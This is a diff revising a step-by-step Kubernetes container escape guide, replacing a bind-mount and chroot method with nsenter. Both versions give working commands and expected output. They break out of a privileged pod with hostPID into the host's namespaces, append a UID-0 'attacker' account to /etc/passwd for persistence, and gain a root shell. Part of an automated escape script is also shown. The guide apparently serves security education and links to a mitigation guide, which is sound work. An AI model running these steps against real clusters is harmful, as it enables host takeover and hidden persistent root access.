@@ -6,7 +6,7 @@ description: "Step-by-step guide on breaking out of a container and gaining cont
 
 # Container Escape Guide
 
-This guide provides a detailed walkthrough of escaping from a container to gain full control over the host system. The process involves mounting the host's filesystem, modifying critical system files, and entering the host's namespaces.
+This guide provides a detailed walkthrough of escaping from a container to gain full control over the host system. The process involves entering the host's namespaces and modifying critical system files.
 
 ## **Warning: Security Risk**
 
@@ -26,7 +26,7 @@ To successfully escape from a container, the following conditions must be met:
 - `allowPrivilegeEscalation: true` must be enabled.
 - `hostPID: true` must be set to share the host’s process namespace.
 - The container must have access to `/proc/1/root`, which exposes the host’s root filesystem.
-- The container must have permission to execute `mount --bind` and `chroot`.
+- The container must have permission to execute `nsenter`.
 - The `/proc` filesystem must be accessible from within the container.
 - The container must be running in privileged mode (`privileged: true`).
 
@@ -66,7 +66,7 @@ kubectl apply -f test-pod.yaml
 
 ## Step 2: Identify the Container Environment
 
-Before attempting to escape, check if the container is running with elevated privileges and if it has access to the host's filesystem.
+Before attempting to escape, check if the container is running with elevated privileges and shares the host’s process namespace.
 
 ### Check the Container’s Mount Namespace
 
@@ -82,56 +82,41 @@ Example output:
 lrwxrwxrwx 1 root root 0 Mar 17 16:38 /proc/1/ns/mnt -> 'mnt:[4026535581]'
 ```
 
-This confirms that the container is isolated in a separate mount namespace from the host.
+This confirms that the container is isolated in a separate mount namespace from the host. We’ll override that using `nsenter`.
 
-## Step 3: Gain Access to the Host’s Root Filesystem
+---
 
-If the container has access to `/proc/1/root`, it may point to the actual root filesystem of the host.
+## Step 3: Escape to the Host’s Namespaces
 
-Check if it exists:
-
-```bash
-ls /proc/1/root
-```
-
-Expected output:
-
-```
-bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
-boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
-```
-
-If the output matches the expected host filesystem structure, proceed.
-
-Now, bind-mount the host’s root filesystem inside the container:
+Use `nsenter` to enter the host’s namespaces. This method is more reliable than attempting bind-mounts.
 
 ```bash
-mkdir /mnt/host
-mount --bind /proc/1/root /mnt/host
+nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
 ```
 
-Verify that the mount was successful:
+Once inside, verify access:
 
 ```bash
-ls /mnt/host
+hostname
+whoami
 ```
 
-If you see `/bin`, `/etc`, `/var`, `/root`, etc., you have access to the host's filesystem.
+If you’re in the host, you will see the host’s actual hostname and be root.
+
+---
 
 ## Step 4: Create a Root User on the Host
 
-Now that we have access to the host’s root filesystem, modify `/etc/passwd` to create a root user.
+Now that we’re inside the host context, you can add a root-level user to the host for persistence:
 
 ```bash
-echo 'attacker:x:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd
+echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd
 ```
-
-This adds a new user `attacker` with UID 0 (root privileges).
 
 To verify:
 
 ```bash
-grep attacker /mnt/host/etc/passwd
+grep attacker /etc/passwd
 ```
 
 Expected output:
@@ -140,72 +125,15 @@ Expected output:
 attacker:x:0:0::/root:/bin/bash
 ```
 
-## Step 5: Escape to the Host’s Root Namespace
+This creates a user named `attacker` with UID 0 (root privileges).
 
-### Option 1: Use `chroot` to Change Root
-
-Now, attempt to switch to the host’s root filesystem:
-
-```bash
-chroot /mnt/host /bin/sh
-```
-
-If successful, running:
-
-```bash
-hostname
-```
-
-should return the host’s actual hostname.
-
-If `chroot` fails with:
-
-```
-can't init_stub: Error { kind: Uncategorized, message: "no /proc/self/exe available. Is /proc mounted?" }
-```
-
-or
-
-```
-chroot: failed to run command '/bin/sh': No such file or directory
-```
-
-then the `/proc`, `/dev`, and `/sys` filesystems must be mounted first.
-
-### Option 2: Bind-Mount Necessary Filesystems
-
-If `chroot` fails, first mount the required system files:
-
-```bash
-mount --bind / /mnt/host
-mount --bind /proc /mnt/host/proc
-mount --bind /sys /mnt/host/sys
-mount --bind /dev /mnt/host/dev
-mount --bind /run /mnt/host/run
-```
-
-Then, try `chroot` again:
-
-```bash
-chroot /mnt/host /bin/sh
-```
-
-If successful, you are now operating inside the host system.
-
-### Option 3: Use `nsenter` to Enter the Host’s Namespaces
-
-If `chroot` still fails, forcefully enter the host’s namespaces using `nsenter`:
-
-```bash
-nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
-```
+---
 
 ## **Automated Container Escape Script**
 
 The following script automates the process of escaping a container by:
 
 - Entering the host’s namespaces.
-- Mounting the host’s filesystem.
 - Adding a new root user for persistence.
 - Providing an interactive shell on the host.
 
@@ -247,14 +175,16 @@ exec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin
 '
 ```
 
+---
+
 ## Conclusion
 
 You successfully escaped the container by:
 
 1. Deploying a privileged pod with `hostPID: true`.
-2. Mounting the host’s root filesystem.
-3. Adding a root user to `/etc/passwd`.
-4. Using `chroot` or `nsenter` to fully break out of container isolation.
+2. Using `nsenter` to join the host’s namespaces.
+3. Adding a root user to the host.
+4. Gaining an interactive root shell on the host.
 
 To learn how to prevent container escape vulnerabilities, refer to the mitigation guide:
 
